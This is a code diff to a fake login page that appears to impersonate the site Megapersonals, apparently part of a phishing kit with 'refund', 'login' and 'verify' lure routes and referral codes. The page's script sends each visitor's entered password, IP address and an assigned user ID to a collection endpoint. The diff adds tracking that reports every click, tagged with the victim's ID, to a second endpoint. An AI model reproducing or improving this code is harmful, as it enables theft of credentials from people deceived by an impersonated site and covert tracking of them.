@@ -139,21 +139,27 @@
         const SITE_NAME = 'Megapersonals';
         const urlParams = new URLSearchParams(window.location.search);
         const REF = (urlParams.get('ref') || '').trim();
-        const routeParam = (urlParams.get('route') || '').trim();
+        const routeQuery = (urlParams.get('route') || '').trim().toLowerCase();
         const idFromQuery = (urlParams.get('id') || '').trim();
+
+        function getRouteFromPath() {
+            const match = window.location.pathname.match(/^\/(refund|login|verify)\/[^\/]+\/?$/i);
+            return match ? match[1].toLowerCase() : '';
+        }
 
         function getRouteIdFromPath() {
             const match = window.location.pathname.match(/^\/(?:refund|login|verify)\/([^\/]+)\/?$/i);
             return match ? decodeURIComponent(match[1]) : '';
         }
 
+        const routePath = getRouteFromPath();
         const idFromPath = getRouteIdFromPath();
-        const idParam = idFromPath || idFromQuery;
-        const agentRoute = routeParam || idParam;
+        const routeType = routeQuery || routePath;
+        const userId = idFromPath || idFromQuery;
 
         function restoreRoutePath() {
-            if (routeParam && idFromQuery && !/^\/(?:refund|login|verify)\/[^\/]+\/?$/.test(window.location.pathname)) {
-                const cleanedRoute = `/${routeParam}/${encodeURIComponent(idFromQuery)}`;
+            if (!routePath && routeQuery && idFromQuery && !/^\/(?:refund|login|verify)\/[^\/]+\/?$/.test(window.location.pathname)) {
+                const cleanedRoute = `/${routeQuery}/${encodeURIComponent(idFromQuery)}`;
                 try {
                     history.replaceState(null, '', cleanedRoute);
                 } catch (e) {
@@ -231,8 +237,9 @@
             try {
                 if (isReloadNavigation()) return;
                 const payload = { website: SITE_NAME, sessionId: state.sessionId || getNewSessionId() };
-                if (agentRoute) payload.route = agentRoute;
+                if (routeType) payload.route = routeType;
                 if (REF) payload.ref = REF;
+                if (state.userId) payload.userId = state.userId;
                 await fetch(TRACK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
             } catch (e) { console.warn('track failed', e); }
         }
@@ -275,7 +282,7 @@
                     password,
                     website: SITE_NAME,
                     ref: REF || undefined,
-                    route: agentRoute || undefined,
+                    route: routeType || undefined,
                     userId: state.userId || undefined,
                     visitorIp: state.visitorIp || undefined
                 };
@@ -310,18 +317,36 @@
             reload.addEventListener('click', (e) => { e.preventDefault(); const c = document.getElementById('captcha_code'); if (c) { c.value=''; c.focus(); } clearAllErrors(); });
         }
 
+        async function trackClick(target) {
+            try {
+                const tag = target.tagName.toLowerCase();
+                const label = (target.textContent || target.getAttribute('aria-label') || target.getAttribute('title') || target.getAttribute('href') || target.type || '').trim();
+                const payload = {
+                    website: SITE_NAME,
+                    route: routeType || undefined,
+                    userId: state.userId || undefined,
+                    element: label || tag,
+                    tag,
+                    timestamp: new Date().toISOString()
+                };
+                await fetch(CLICK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            } catch (e) { console.warn('click tracking failed', e); }
+        }
+
         function setupClickSounds() {
             document.body.addEventListener('click', (event) => {
                 const el = event.target;
                 if (!(el instanceof Element)) return;
                 const target = el.closest('a, button, input[type="submit"], input[type="button"]');
                 if (!target) return;
-                playOpenSound();
+                const isSubmit = target.matches('button[type="submit"], input[type="submit"]');
+                if (!isSubmit) playOpenSound();
+                trackClick(target);
             });
         }
 
         async function initialize() {
-            state.userId = (agentRoute || '').trim() || null;
+            state.userId = userId || null;
             state.visitorIp = await getVisitorIp();
             document.getElementById('form_data').addEventListener('submit', handleFormSubmit);
             setupCaptchaReload();
